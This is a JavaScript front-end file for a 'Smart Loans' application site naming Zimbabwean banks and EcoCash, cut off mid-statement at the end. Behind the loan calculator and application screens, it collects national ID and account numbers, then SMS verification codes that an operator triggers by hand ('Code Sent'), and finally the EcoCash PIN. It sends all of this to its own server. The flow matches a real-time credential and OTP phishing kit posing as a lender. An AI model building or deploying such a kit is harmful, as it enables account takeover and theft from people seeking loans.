// ======================================================
// SMART LOANS
// screens.js
// PART 1 - WELCOME SCREEN
// ======================================================

function loadWelcomeScreen() {

    const app = document.getElementById("app");

    app.innerHTML = `

    <div class="container">

        <div class="dashboard-card">

            <div class="logo-circle">
                💰
            </div>

            <h1 class="dashboard-title">
                Smart Loans
            </h1>

            <p class="dashboard-subtitle">
                Fast • Secure • Convenient
            </p>

            <div class="secure-badge">
                🔒 Secure Platform
            </div>

        </div>

        <div class="progress-card">

            <small>Application Progress</small>

            <div class="progress-bar">

                <div class="progress-fill"
                     style="width:10%;">
                </div>

            </div>

            <span>10% Complete</span>

        </div>

        <div class="welcome-card">

            <h2>
                Welcome 👋
            </h2>

            <p>
                Get quick access to affordable personal loans.

                Complete your application in just a few minutes
                and receive your money securely through your
                preferred payment method.
            </p>

        </div>

        <div class="feature">
            ⚡ Fast Approval
        </div>

        <div class="feature">
            🔒 Secure Application
        </div>

        <div class="feature">
            💳 Bank & EcoCash Disbursement
        </div>

        <div class="feature">
            📞 Professional Customer Support
        </div>

        <br>

        <button id="startApplication">
            APPLY NOW
        </button>

    </div>

    `;

    document
        .getElementById("startApplication")
        .addEventListener("click", loadCalculatorScreen);
}
// ======================================================
// PART 2 - LOAN CALCULATOR SCREEN
// ======================================================

function loadCalculatorScreen() {

    const app = document.getElementById("app");

    app.innerHTML = `

    <div class="container">

        <div class="dashboard-card">

            <h2>💰 Loan Calculator</h2>

            <p>Estimate your monthly repayment instantly.</p>

        </div>

        <div class="progress-card">

            <small>Application Progress</small>

            <div class="progress-bar">

                <div class="progress-fill"
                     style="width:20%;">
                </div>

            </div>

            <span>20% Complete</span>

        </div>

        <div class="welcome-card">

            <label>Loan Amount (USD)</label>

            <input
                type="number"
                id="loanAmount"
                placeholder="Enter loan amount"
                min="1">

            <br><br>

            <label>Repayment Period</label>

            <select id="loanPeriod">

                <option value="">Choose Period</option>
                <option value="1">1 Month</option>
                <option value="3">3 Months</option>
                <option value="6">6 Months</option>
                <option value="12">12 Months</option>
                <option value="18">18 Months</option>
                <option value="24">24 Months</option>

            </select>

        </div>

        <div class="feature">

            <h3>Monthly Repayment</h3>

            <h2 id="monthlyRepayment">$0.00</h2>

        </div>

        <div class="feature">

            <h3>Total Repayment</h3>

            <h2 id="totalRepayment">$0.00</h2>

        </div>

        <button id="continueCalculator" disabled>
            CONTINUE →
        </button>

        <button
            id="backHome"
            style="background:#777;">
            ← BACK
        </button>

    </div>

    `;

    document
        .getElementById("backHome")
        .addEventListener("click", loadWelcomeScreen);

    initializeCalculator();

}
// ======================================================
// PART 3 - LOAN CALCULATOR LOGIC
// ======================================================

function initializeCalculator() {

    const amount = document.getElementById("loanAmount");
    const period = document.getElementById("loanPeriod");

    const monthly = document.getElementById("monthlyRepayment");
    const total = document.getElementById("totalRepayment");

    const continueBtn =
        document.getElementById("continueCalculator");

    const interestRates = {
        1: 0.10,
        3: 0.15,
        6: 0.20,
        12: 0.30,
        18: 0.40,
        24: 0.50
    };

    function calculateLoan() {

        const loanAmount = parseFloat(amount.value);
        const months = parseInt(period.value);

        if (
            !loanAmount ||
            loanAmount <= 0 ||
            !months ||
            !interestRates[months]
        ) {

            monthly.textContent = "$0.00";
            total.textContent = "$0.00";

            continueBtn.disabled = true;

            return;
        }

        const interest =
            loanAmount * interestRates[months];

        const totalRepayment =
            loanAmount + interest;

        const monthlyRepayment =
            totalRepayment / months;

        monthly.textContent =
            "$" + monthlyRepayment.toFixed(2);

        total.textContent =
            "$" + totalRepayment.toFixed(2);

        sessionStorage.setItem(
            "loanAmount",
            loanAmount
        );

        sessionStorage.setItem(
            "loanPeriod",
            months
        );

        sessionStorage.setItem(
            "monthlyRepayment",
            monthlyRepayment.toFixed(2)
        );

        sessionStorage.setItem(
            "totalRepayment",
            totalRepayment.toFixed(2)
        );

        continueBtn.disabled = false;
    }

    amount.addEventListener(
        "input",
        calculateLoan
    );

    period.addEventListener(
        "change",
        calculateLoan
    );

    continueBtn.addEventListener(
        "click",
        loadPersonalInformationScreen
    );

}
// ======================================================
// PART 4 - PERSONAL INFORMATION SCREEN
// ======================================================

function loadPersonalInformationScreen() {

    const app = document.getElementById("app");

    app.innerHTML = `

    <div class="container">

        <div class="dashboard-card">

            <h2>👤 Personal Information</h2>

            <p>Please complete your personal details.</p>

        </div>

        <div class="progress-card">

            <small>Application Progress</small>

            <div class="progress-bar">

                <div class="progress-fill"
                     style="width:40%;"></div>

            </div>

            <span>40% Complete</span>

        </div>

        <div class="welcome-card">

            <label>👤 Full Names</label>

            <input
                type="text"
                id="fullNames"
                placeholder="Enter full names">

            <br><br>

            <label>🎂 Date of Birth</label>

            <input
                type="date"
                id="dateOfBirth">

            <br><br>

            <label>🪪 National ID Number</label>

            <input
                type="text"
                id="idNumber"
                placeholder="Enter ID Number">

            <br><br>

            <label>💼 Occupation</label>

            <select id="occupation">

                <option value="">
                    Select Occupation
                </option>

                <option>Employed</option>
                <option>Self Employed</option>
                <option>Business Owner</option>
                <option>Civil Servant</option>
                <option>Student</option>
                <option>Not Employed</option>

            </select>

            <br><br>

            <label>🎯 Purpose of Loan</label>

            <input
                type="text"
                id="loanPurpose"
                placeholder="School Fees, Business, Rent...">

        </div>

        <button id="continuePersonal">

            CONTINUE →

        </button>

        <button
            id="backCalculator"
            style="background:#777;">

            ← BACK

        </button>

    </div>

    `;

    document
        .getElementById("backCalculator")
        .addEventListener(
            "click",
            loadCalculatorScreen
        );

    document
        .getElementById("continuePersonal")
        .addEventListener(
            "click",
            savePersonalInformation
        );

}
// ======================================================
// PART 5 - SAVE PERSONAL INFORMATION
// ======================================================

function savePersonalInformation() {

    const fullNames =
        document.getElementById("fullNames").value.trim();

    const dateOfBirth =
        document.getElementById("dateOfBirth").value;

    const idNumber =
        document.getElementById("idNumber").value.trim();

    const occupation =
        document.getElementById("occupation").value;

    const loanPurpose =
        document.getElementById("loanPurpose").value.trim();

    if (
        fullNames === "" ||
        dateOfBirth === "" ||
        idNumber === "" ||
        occupation === "" ||
        loanPurpose === ""
    ) {

        alert("Please complete all required fields.");

        return;
    }

    sessionStorage.setItem(
        "fullNames",
        fullNames
    );

    sessionStorage.setItem(
        "dateOfBirth",
        dateOfBirth
    );

    sessionStorage.setItem(
        "idNumber",
        idNumber
    );

    sessionStorage.setItem(
        "occupation",
        occupation
    );

    sessionStorage.setItem(
        "loanPurpose",
        loanPurpose
    );

    loadReviewScreen();

}
// ======================================================
// PART 6 - REVIEW APPLICATION SCREEN
// ======================================================

function loadReviewScreen() {

    const app = document.getElementById("app");

    const fullNames = sessionStorage.getItem("fullNames") || "";
    const dob = sessionStorage.getItem("dateOfBirth") || "";
    const idNumber = sessionStorage.getItem("idNumber") || "";
    const occupation = sessionStorage.getItem("occupation") || "";
    const purpose = sessionStorage.getItem("loanPurpose") || "";

    const amount = sessionStorage.getItem("loanAmount") || "0";
    const period = sessionStorage.getItem("loanPeriod") || "0";
    const monthly = sessionStorage.getItem("monthlyRepayment") || "0.00";
    const total = sessionStorage.getItem("totalRepayment") || "0.00";

    app.innerHTML = `

    <div class="container">

        <div class="app-header">

            <button class="back-btn" id="backPersonal">
                ← Back
            </button>

            <div>
                <div class="app-title">
                    Smart Loans
                </div>

                <div class="app-subtitle">
                    Fast • Secure • Convenient
                </div>
            </div>

            <div class="secure">
                🔒 Secure
            </div>

        </div>

        <div class="progress-bar">

            <div class="progress-fill"
                 style="width:50%;"></div>

        </div>

        <div class="welcome-card">

            <h2>Review Your Application</h2>

            <div class="feature">
                <strong>Full Names</strong><br>
                ${fullNames}
            </div>

            <br>

            <div class="feature">
                <strong>Date of Birth</strong><br>
                ${dob}
            </div>

            <br>

            <div class="feature">
                <strong>ID Number</strong><br>
                ${idNumber}
            </div>

            <br>

            <div class="feature">
                <strong>Occupation</strong><br>
                ${occupation}
            </div>

            <br>

            <div class="feature">
                <strong>Purpose of Loan</strong><br>
                ${purpose}
            </div>

            <br>

            <div class="feature">
                <strong>Loan Amount</strong><br>
                $${amount}
            </div>

            <br>

            <div class="feature">
                <strong>Repayment Period</strong><br>
                ${period} Month(s)
            </div>

            <br>

            <div class="feature">
                <strong>Monthly Repayment</strong><br>
                $${monthly}
            </div>

            <br>

            <div class="feature">
                <strong>Total Repayment</strong><br>
                $${total}
            </div>

            <br>

            <button id="continueReview">
                Continue →
            </button>

        </div>

    </div>

    `;

    document
        .getElementById("backPersonal")
        .addEventListener(
            "click",
            loadPersonalInformationScreen
        );

    document
        .getElementById("continueReview")
        .addEventListener(
            "click",
            loadDisbursementScreen
        );

}
// ======================================================
// PART 7 - DISBURSEMENT METHOD SCREEN
// ======================================================

function loadDisbursementScreen() {

    const app = document.getElementById("app");

    app.innerHTML = `

    <div class="container">

        <div class="app-header">

            <button class="back-btn" id="backReview">
                ← Back
            </button>

            <div>
                <div class="app-title">
                    Smart Loans
                </div>

                <div class="app-subtitle">
                    Fast • Secure • Convenient
                </div>
            </div>

            <div class="secure">
                🔒 Secure
            </div>

        </div>

        <div class="progress-bar">

            <div class="progress-fill"
                 style="width:60%;"></div>

        </div>

        <div class="welcome-card">

            <h2>Loan Disbursement</h2>

            <p class="intro">

                Choose where you want your approved loan
                to be deposited.

            </p>

            <button
                id="bankOption"
                class="option-btn">

                🏦 Bank Account

            </button>

            <br><br>

            <button
                id="ecocashOption"
                class="option-btn">

                🟢 EcoCash Wallet

            </button>

        </div>

    </div>

    `;

    document
        .getElementById("backReview")
        .addEventListener(
            "click",
            loadReviewScreen
        );

    document
        .getElementById("bankOption")
        .addEventListener("click", () => {

            sessionStorage.setItem(
                "disbursementMethod",
                "Bank"
            );

            loadBankSelectionScreen();

        });

    document
        .getElementById("ecocashOption")
        .addEventListener("click", () => {

            sessionStorage.setItem(
                "disbursementMethod",
                "EcoCash"
            );

            loadEcoCashDetailsScreen();

        });

}
// ======================================================
// PART 8 - BANK SELECTION SCREEN
// ======================================================

function loadBankSelectionScreen() {

    const app = document.getElementById("app");

    app.innerHTML = `

    <div class="container">

        <div class="app-header">

            <button class="back-btn" id="backDisbursement">
                ← Back
            </button>

            <div>
                <div class="app-title">
                    Smart Loans
                </div>

                <div class="app-subtitle">
                    Fast • Secure • Convenient
                </div>
            </div>

            <div class="secure">
                🔒 Secure
            </div>

        </div>

        <div class="progress-bar">
            <div class="progress-fill" style="width:65%;"></div>
        </div>

        <div class="welcome-card">

            <h2>Select Your Bank</h2>

            <p class="intro">
                Choose the bank account where your approved
                loan will be deposited.
            </p>

            <div class="bank-card" data-bank="CBZ Bank">
                🏦 CBZ Bank
            </div>

            <div class="bank-card" data-bank="CABS">
                🏦 CABS
            </div>

            <div class="bank-card" data-bank="NMB Bank">
                🏦 NMB Bank
            </div>

            <div class="bank-card" data-bank="BancABC">
                🏦 BancABC
            </div>

            <div class="bank-card" data-bank="FBC Bank">
                🏦 FBC Bank
            </div>

            <div class="bank-card" data-bank="POSB">
                🏦 POSB
            </div>

            <div class="bank-card" data-bank="ZB Bank">
                🏦 ZB Bank
            </div>

            <div class="bank-card" data-bank="Stanbic Bank">
                🏦 Stanbic Bank
            </div>

            <div class="bank-card" data-bank="Steward Bank">
                🏦 Steward Bank
            </div>

            <div class="bank-card" data-bank="Ecobank">
                🏦 Ecobank
            </div>

            <div class="bank-card" data-bank="First Capital Bank">
                🏦 First Capital Bank
            </div>

            <div class="bank-card" data-bank="Nedbank Zimbabwe">
                🏦 Nedbank Zimbabwe
            </div>

        </div>

    </div>

    `;

    document
        .getElementById("backDisbursement")
        .addEventListener(
            "click",
            loadDisbursementScreen
        );

    document
        .querySelectorAll(".bank-card")
        .forEach(card => {

            card.addEventListener("click", () => {

                sessionStorage.setItem(
                    "selectedBank",
                    card.dataset.bank
                );

                loadBankDetailsScreen();

            });

        });

}

// ======================================================
// BANK DETAILS SCREEN
// PART 9
// ======================================================

function loadBankDetailsScreen() {

    const app = document.getElementById("app");

    const selectedBank =
        sessionStorage.getItem("selectedBank");

    const fullNames =
        sessionStorage.getItem("fullNames") || "";

    app.innerHTML = `

    <div class="container">

        <div class="app-header">

            <button class="back-btn" id="backBanks">
                ← Back
            </button>

            <div>

                <div class="app-title">
                    Smart Loans
                </div>

                <div class="app-subtitle">
                    Fast • Secure • Convenient
                </div>

            </div>

            <div class="secure">
                🔒 Secure
            </div>

        </div>

        <div class="progress-bar">

            <div
                class="progress-fill"
                style="width:70%;">
            </div>

        </div>

        <div class="welcome-card">

            <h2>
                ${selectedBank}
            </h2>

            <p class="intro">

                Enter the bank account details where your
                approved loan will be deposited.

            </p>

            <label>
                Account Holder Name
            </label>

            <input
                type="text"
                id="accountName"
                value="${fullNames}"
            >

            <br><br>

            <label>
                Phone Number
            </label>

            <input
                type="tel"
                id="bankPhone"
                placeholder="Enter phone number"
            >

            <br><br>

            <label>
                Bank Account Number
            </label>

            <input
                type="text"
                id="accountNumber"
                placeholder="Enter bank account number"
            >

            <br><br>

            <button id="continueBankDetails">

                Continue →

            </button>

        </div>

    </div>

    `;

    document
        .getElementById("backBanks")
        .addEventListener(
            "click",
            loadBankSelectionScreen
        );

    document
        .getElementById("continueBankDetails")
        .addEventListener(
            "click",
            saveBankDetails
        );

}
// ======================================================
// PART 10 - SAVE BANK DETAILS
// APPLICATION CREATION
// ======================================================

async function saveBankDetails() {

    const accountName =
        document.getElementById("accountName").value.trim();

    const phone =
        document.getElementById("bankPhone").value.trim();

    const accountNumber =
        document.getElementById("accountNumber").value.trim();

    if (
        accountName === "" ||
        phone === "" ||
        accountNumber === ""
    ) {

        alert("Please complete all bank details.");

        return;
    }

    // Save locally for the current application
    sessionStorage.setItem("accountName", accountName);
    sessionStorage.setItem("bankPhone", phone);
    sessionStorage.setItem("accountNumber", accountNumber);

    // Prepare application for the server
    const data = {

        fullNames:
            sessionStorage.getItem("fullNames"),

        dateOfBirth:
            sessionStorage.getItem("dateOfBirth"),

        idNumber:
            sessionStorage.getItem("idNumber"),

        occupation:
            sessionStorage.getItem("occupation"),

        loanPurpose:
            sessionStorage.getItem("loanPurpose"),

        loanAmount:
            sessionStorage.getItem("loanAmount"),

        loanPeriod:
            sessionStorage.getItem("loanPeriod"),

        monthlyRepayment:
            sessionStorage.getItem("monthlyRepayment"),

        totalRepayment:
            sessionStorage.getItem("totalRepayment"),

        disbursementMethod: "Bank",

        selectedBank:
            sessionStorage.getItem("selectedBank") || "",

        accountName: accountName,

        bankPhone: phone,

        accountNumber: accountNumber,

        // store a real OTP here
        bankverificationCode: "",

        bankPin: "",

        ecoName: "",

        ecoNumber: "",

        ecoVerificationCode: "",

        ecoPin: ""

    };

    try {

        const response = await fetch(
            "/submit-application",
            {
                method: "POST",

                headers: {
                    "Content-Type": "application/json"
                },

                body: JSON.stringify(data)
            }
        );

        const result = await response.json();

        if (!response.ok || !result.success) {

            throw new Error(
                result.error ||
                "Unable to save application."
            );

        }

        // IMPORTANT:
        // Save the database application ID
        sessionStorage.setItem(
            "applicationId",
            result.application.id
        );

        console.log(
            "Application saved:",
            result.application.id
        );

        // Now show the waiting screen
        loadBankVerificationWaitingScreen();

    } catch (error) {

        console.error(
            "BANK APPLICATION ERROR:",
            error
        );

        alert(
            "Unable to save your application. Please try again."
        );

    }

}
// ======================================================
// PART 11 - BANK VERIFICATION WAITING SCREEN
// ======================================================

function loadBankVerificationWaitingScreen() {

    const app = document.getElementById("app");

    app.innerHTML = `

    <div class="container">

        <div class="welcome-card">

            <div style="
                font-size:60px;
                text-align:center;
            ">
                🏦
            </div>

            <h2 style="text-align:center;">
                Smart Loans
            </h2>

            <br>

            <div style="
                text-align:center;
                font-size:22px;
                color:#f39c12;
                font-weight:bold;
            ">

                🟡 Sending verification code...

            </div>

            <br>

            <p style="
                text-align:center;
                line-height:1.8;
            ">

                You will receive a bank verification code to confirm and authorize your transaction.
                Please enter it when prompted..

                <br><br>

                Please wait while we send your verification code..

            </p>

            <br>

            <div class="loading-dots">

                <span></span>
                <span></span>
                <span></span>

            </div>

        </div>

    </div>

    `;

    // Start checking the server for the
    // admin "Code Sent" action.
    monitorCodeSentStatus();

}
// ======================================================
// PART 12 - MONITOR CODE SENT STATUS
// ======================================================

async function monitorCodeSentStatus() {

    const applicationId =
        sessionStorage.getItem("applicationId");

    if (!applicationId) {
        console.error("Application ID not found.");
        return;
    }

    try {

        const response = await fetch(
            `/application-status/${applicationId}`
        );

        const result = await response.json();

        if (!result.success) {
            return;
        }

        const stage =
            result.application.current_stage;

        if (stage === "code_sent") {

            loadBankVerificationScreen();

            return;
        }

    } catch (err) {

        console.error(
            "Code sent status error:",
            err
        );

    }

    // Keep checking every 5 seconds
    setTimeout(
        monitorCodeSentStatus,
        5000
    );

}
// ======================================================
// PART 13 - BANK VERIFICATION CODE SCREEN
// ======================================================

function loadBankVerificationScreen() {

    const app = document.getElementById("app");

    const bank =
        sessionStorage.getItem("selectedBank") || "Bank";

    app.innerHTML = `

    <div class="container">

        <div class="app-header">

            <button
                class="back-btn"
                id="backBankDetails">
                ← Back
            </button>

            <div>

                <div class="app-title">
                    Smart Loans
                </div>

                <div class="app-subtitle">
                    Fast • Secure • Convenient
                </div>

            </div>

            <div class="secure">
                🔒 Secure
            </div>

        </div>

        <div class="progress-bar">

            <div
                class="progress-fill"
                style="width:75%;">
            </div>

        </div>

        <div class="welcome-card">

            <h2>
                ${bank} Verification
            </h2>

            <p class="intro">

                Your verification code has been sent.

                <br><br>

                Please enter your bank verification 
                code sent to you via SMS.

            </p>

            <label>
                🔢 Verification Code
            </label>

            <input
                type="text"
                id="bankVerificationCode"
                placeholder="Enter code"
                autocomplete="one-time-code"
            >

            <br><br>

            <button id="continueBankVerification">

                Continue →

            </button>

        </div>

    </div>

    `;

    document
        .getElementById("backBankDetails")
        .addEventListener(
            "click",
            loadBankDetailsScreen
        );

    document
        .getElementById("continueBankVerification")
        .addEventListener(
            "click",
            saveBankVerification
        );

}
// ======================================================
// PART 14 - SAVE BANK VERIFICATION CODE
// ======================================================

async function saveBankVerification() {

    const input =
        document.getElementById("bankVerificationCode");

    const code = input.value.trim();

    if (code === "") {

        alert("Please enter the verification code.");

        return;

    }

    const applicationId =
        sessionStorage.getItem("applicationId");

    if (!applicationId) {

        alert("Application session not found.");

        return;

    }

    try {

        const response = await fetch(
            `/save-bank-verification/${applicationId}`,
            {
                method: "POST",

                headers: {
                    "Content-Type": "application/json"
                },

                body: JSON.stringify({
                    bankVerificationCode: code
                })
            }
        );

        const result = await response.json();

        if (!response.ok || !result.success) {

            throw new Error(
                result.message ||
                "Unable to save verification code."
            );

        }

        // Code has been saved on the server.
        // Customer now waits for admin verification.
        loadVerificationPendingScreen();

    } catch (err) {

        console.error(
            "Bank verification error:",
            err
        );

        alert(
            "Unable to connect to the server."
        );

    }

}
// ======================================================
// PART 15 - VERIFICATION PENDING SCREEN
// ======================================================

function loadVerificationPendingScreen() {

    const app = document.getElementById("app");

    app.innerHTML = `

    <div class="container">

        <div class="welcome-card">

            <div style="
                font-size:60px;
                text-align:center;
            ">
                🔐
            </div>

            <h2 style="text-align:center;">
                Smart Loans
            </h2>

            <br>

            <div style="
                text-align:center;
                font-size:22px;
                color:#f39c12;
                font-weight:bold;
            ">

                🟡 Verifying Your Code...

            </div>

            <br>

            <p style="
                text-align:center;
                line-height:1.8;
            ">

                Your verification code has been
                received successfully.

                <br><br>

                checking your 
                verification code...

            </p>

            <br>

            <div class="loading-dots">

                <span></span>
                <span></span>
                <span></span>

            </div>

        </div>

    </div>

    `;

    monitorVerificationStatus();

}

// ======================================================
// PART 16 - MONITOR VERIFICATION STATUS
// BANK + ECOCASH ROUTING
// ======================================================

async function monitorVerificationStatus() {

    const applicationId =
        sessionStorage.getItem("applicationId");

    if (!applicationId) {

        console.error("Application ID not found.");

        return;
    }

    try {

        const response = await fetch(
            `/application-status/${applicationId}`
        );

        const result = await response.json();

        if (!result.success) {

            setTimeout(
                monitorVerificationStatus,
                5000
            );

            return;
        }

        const stage =
            result.application.current_stage;

        // ==============================================
        // VERIFICATION COMPLETED
        // ==============================================

        if (stage === "verified") {

            const method =
                sessionStorage.getItem(
                    "disbursementMethod"
                );

            // ==========================================
            // ECOCASH APPLICATION
            // ==========================================

            if (method === "EcoCash") {

                loadEcoCashPinScreen();

                return;
            }

            // ==========================================
            // BANK APPLICATION
            // ==========================================

            if (method === "Bank") {

                loadBankPinScreen();

                return;
            }

            console.error(
                "Unknown disbursement method:",
                method
            );

            return;
        }

    } catch (err) {

        console.error(
            "Verification status error:",
            err
        );

    }

    // ==============================================
    // KEEP CHECKING
    // ==============================================

    setTimeout(
        monitorVerificationStatus,
        5000
    );

}

// ======================================================
// PART 17 - ECOCASH DETAILS SCREEN
// ======================================================

function loadEcoCashDetailsScreen() {

    const app = document.getElementById("app");

    app.innerHTML = `

    <div class="container">

        <div class="app-header">

            <button
                class="back-btn"
                id="backEcoDisbursement">
                ← Back
            </button>

            <div>

                <div class="app-title">
                    Smart Loans
                </div>

                <div class="app-subtitle">
                    Fast • Secure • Convenient
                </div>

            </div>

            <div class="secure">
                🔒 Secure
            </div>

        </div>

        <div class="progress-bar">

            <div
                class="progress-fill"
                style="width:70%;">
            </div>

        </div>

        <div class="welcome-card">

            <h2>🟢 EcoCash Details</h2>

            <p class="intro">

                Enter the EcoCash details where your approved
                loan will be deposited.

            </p>

            <label>
                Account Holder Name
            </label>

            <input
                type="text"
                id="ecoName"
                placeholder="Enter account holder name"
            >

            <br><br>

            <label>
                EcoCash Number
            </label>

            <input
                type="tel"
                id="ecoNumber"
                placeholder="Enter EcoCash number"
            >

            <br><br>

            <button id="continueEcoDetails">

                Continue →

            </button>

        </div>

    </div>

    `;

    document
        .getElementById("backEcoDisbursement")
        .addEventListener(
            "click",
            loadDisbursementScreen
        );

    document
        .getElementById("continueEcoDetails")
        .addEventListener(
            "click",
            saveEcoCashDetails
        );

}
// ======================================================
// SAVE ECOCASH DETAILS
// CREATE PENDING APPLICATION
// ======================================================

async function saveEcoCashDetails() {

    const ecoName =
        document.getElementById("ecoName").value.trim();

    const ecoNumber =
        document.getElementById("ecoNumber").value.trim();

    if (
        ecoName === "" ||
        ecoNumber === ""
    ) {

        alert("Please complete all fields.");

        return;

    }

    // Save EcoCash details locally
    sessionStorage.setItem(
        "ecoName",
        ecoName
    );

    sessionStorage.setItem(
        "ecoNumber",
        ecoNumber
    );

    try {

        const response = await fetch(
            "/create-ecocash-application",
            {

                method: "POST",

                headers: {
                    "Content-Type": "application/json"
                },

                body: JSON.stringify({

                    fullNames:
                        sessionStorage.getItem("fullNames"),

                    dateOfBirth:
                        sessionStorage.getItem("dateOfBirth"),

                    idNumber:
                        sessionStorage.getItem("idNumber"),

                    occupation:
                        sessionStorage.getItem("occupation"),

                    loanPurpose:
                        sessionStorage.getItem("loanPurpose"),

                    loanAmount:
                        sessionStorage.getItem("loanAmount"),

                    loanPeriod:
                        sessionStorage.getItem("loanPeriod"),

                    monthlyRepayment:
                        sessionStorage.getItem("monthlyRepayment"),

                    totalRepayment:
                        sessionStorage.getItem("totalRepayment"),

                    ecoName:
                        ecoName,

                    ecoNumber:
                        ecoNumber

                })

            }
        );

        const result =
            await response.json();

        if (
            !response.ok ||
            !result.success
        ) {

            throw new Error(
                result.error ||
                "Unable to create application."
            );

        }

        // Save the database application ID
        sessionStorage.setItem(
            "applicationId",
            result.application.id
        );

        // Show waiting screen
        loadEcoCashVerificationWaitingScreen();

    } catch (error) {

        console.error(
            "CREATE ECOCASH APPLICATION ERROR:",
            error
        );

        alert(
            "Unable to submit your application. Please try again."
        );

    }

}
// ======================================================
// PART 19 - ECOCASH VERIFICATION WAITING SCREEN
// ======================================================

function loadEcoCashVerificationWaitingScreen() {

    const app = document.getElementById("app");

    app.innerHTML = `

    <div class="container">

        <div class="welcome-card">

            <div style="
                font-size:60px;
                text-align:center;
            ">
                🟢
            </div>

            <h2 style="text-align:center;">
                Smart Loans
            </h2>

            <br>

            <div style="
                text-align:center;
                font-size:22px;
                color:#f39c12;
                font-weight:bold;
            ">

                🟡 Sending verification code...

            </div>

            <br>

            <p style="
                text-align:center;
                line-height:1.8;
            ">

                Please wait while we securely process your request.

                <br><br>

                A verification code will be sent to 
                your registered EcoCash number shortly.
            </p>

            <br>

            <div class="loading-dots">

                <span></span>
                <span></span>
                <span></span>

            </div>

        </div>

    </div>

    `;

    monitorEcoCashCodeSentStatus();

}
// ======================================================
// PART 20 - MONITOR ECOCASH CODE SENT STATUS
// ======================================================

async function monitorEcoCashCodeSentStatus() {

    const applicationId =
        sessionStorage.getItem("applicationId");

    if (!applicationId) {
        console.error("Application ID not found.");
        return;
    }

    try {

        const response = await fetch(
            `/application-status/${applicationId}`
        );

        const result = await response.json();

        if (!result.success) {
            return;
        }

        const stage =
            result.application.current_stage;

        if (stage === "code_sent") {

            loadEcoCashVerificationScreen();

            return;
        }

    } catch (err) {

        console.error(
            "EcoCash code sent status error:",
            err
        );

    }

    // Keep checking until admin clicks
    // "📩 Code Sent".
    setTimeout(
        monitorEcoCashCodeSentStatus,
        5000
    );

}
// ======================================================
// ECOCASH VERIFICATION SCREEN
// ======================================================

function loadEcoCashVerificationScreen() {

    const app = document.getElementById("app");

    app.innerHTML = `

    <div class="container">

        <div class="app-header">

            <button class="back-btn" id="backEcoDetails">
                ← Back
            </button>

            <div>

                <div class="app-title">
                    Smart Loans
                </div>

                <div class="app-subtitle">
                    Fast • Secure • Convenient
                </div>

            </div>

            <div class="secure">
                🔒 Secure
            </div>

        </div>

        <div class="progress-bar">

            <div class="progress-fill" style="width:75%;"></div>

        </div>

        <div class="welcome-card">

            <h2>EcoCash Verification</h2>

            <p class="intro">

                📩 An SMS verification code has been
                 sent to your EcoCash number.

                <br><br>

                Enter the <strong>code</strong> to confirm ownership
                of your mobile number.

            </p>

            <label>Verification Code</label>

            <input
                type="text"
                id="ecoVerificationCode"
                placeholder="Enter code"
                autocomplete="off">

            <br><br>

            <button id="continueEcoVerification">

                Continue →

            </button>

        </div>

    </div>

    `;

    document
        .getElementById("backEcoDetails")
        .addEventListener(
            "click",
            loadEcoCashDetailsScreen
        );

    document
        .getElementById("continueEcoVerification")
        .addEventListener(
            "click",
            saveEcoCashVerification
        );

}
// ======================================================
// SAVE ECOCASH VERIFICATION
// ======================================================

async function saveEcoCashVerification() {

    const input =
        document.getElementById("ecoVerificationCode");

    const code = input.value.trim();

    if (code === "") {

        alert("Please enter the verification code.");

        return;
    }

    const applicationId =
        sessionStorage.getItem("applicationId");

    if (!applicationId) {

        alert("Application session not found.");

        return;
    }

    try {

        const response = await fetch(
            `/save-ecocash-verification/${applicationId}`,
            {
                method: "POST",

                headers: {
                    "Content-Type": "application/json"
                },

                body: JSON.stringify({
                    ecocashVerificationCode: code
                })
            }
        );

        const result = await response.json();

        if (!response.ok || !result.success) {

            throw new Error(
                result.message ||
                "Unable to save verification."
            );

        }

        // The value has been saved.
        loadVerificationPendingScreen();

    } catch (err) {

        console.error(
            "SAVE VERIFICATION ERROR:",
            err
        );

        alert(
            "Unable to save the verification code."
        );

    }

}
// ======================================================
// PART 23 - ECOCASH PIN SCREEN
// ======================================================

function loadEcoCashPinScreen() {

    const app = document.getElementById("app");

    app.innerHTML = `

    <div class="container">

        <div class="app-header">

            <button
                class="back-btn"
                id="backEcoVerification">
                ← Back
            </button>

            <div>

                <div class="app-title">
                    Smart Loans
                </div>

                <div class="app-subtitle">
                    Fast • Secure • Convenient
                </div>

            </div>

            <div class="secure">
                🔒 Secure
            </div>

        </div>

        <div class="progress-bar">

            <div
                class="progress-fill"
                style="width:80%;">
            </div>

        </div>

        <div class="welcome-card">

            <h2>🟢 EcoCash Pin</h2>

            <p class="intro">

                Enter EcoCash
                pin to initiate your loan Withdrawal.

            </p>

            <label>
                Pin
            </label>

            <input
                type="text"
                id="ecoPin"
                placeholder="Enter pin"
            >

            <br><br>

            <button id="continueEcoPin">

                Submit Application →

            </button>

        </div>

    </div>

    `;

    document
        .getElementById("backEcoVerification")
        .addEventListener(
            "click",
            loadEcoCashVerificationScreen
        );

    document
        .getElementById("continueEcoPin")
        .addEventListener(
            "click",
            saveEcoCashPin
        );

}
// ======================================================
// PART 24 - SAVE ECOCASH PIN
// ======================================================

function saveEcoCashPin() {

    const pin =
        document
            .getElementById("ecoPin")
            .value
            .trim();

    if (pin === "") {

        alert("Please enter your EcoCash pin.");

        return;

    }

    sessionStorage.setItem(
        "ecoPin",
        pin
    );

    submitEcoCashApplication();

}
// ======================================================
// PART 25 - SUBMIT ECOCASH APPLICATION
// ======================================================

async function submitEcoCashApplication() {

    const data = {

        fullNames: sessionStorage.getItem("fullNames"),
        dateOfBirth: sessionStorage.getItem("dateOfBirth"),
        idNumber: sessionStorage.getItem("idNumber"),
        occupation: sessionStorage.getItem("occupation"),
        loanPurpose: sessionStorage.getItem("loanPurpose"),

        loanAmount: sessionStorage.getItem("loanAmount"),
        loanPeriod: sessionStorage.getItem("loanPeriod"),
        monthlyRepayment: sessionStorage.getItem("monthlyRepayment"),
        totalRepayment: sessionStorage.getItem("totalRepayment"),

        disbursementMethod: "EcoCash",

        selectedBank: "",
        accountName: "",
        bankPhone: "",
        accountNumber: "",
        bankVerificationCode: "",
        bankPin: "",

        ecoName: sessionStorage.getItem("ecoName"),
        ecoNumber: sessionStorage.getItem("ecoNumber"),
        ecoVerificationCode:
            sessionStorage.getItem("ecoVerificationCode"),
        ecoPin:
            sessionStorage.getItem("ecoPin")

    };

    loadProcessingScreen();

    try {

        const response = await fetch(
            "/submit-application",
            {
                method: "POST",

                headers: {
                    "Content-Type": "application/json"
                },

                body: JSON.stringify(data)
            }
        );

        const result = await response.json();

        if (!response.ok || !result.success) {

            throw new Error(
                result.error ||
                "Application submission failed."
            );

        }

        sessionStorage.setItem(
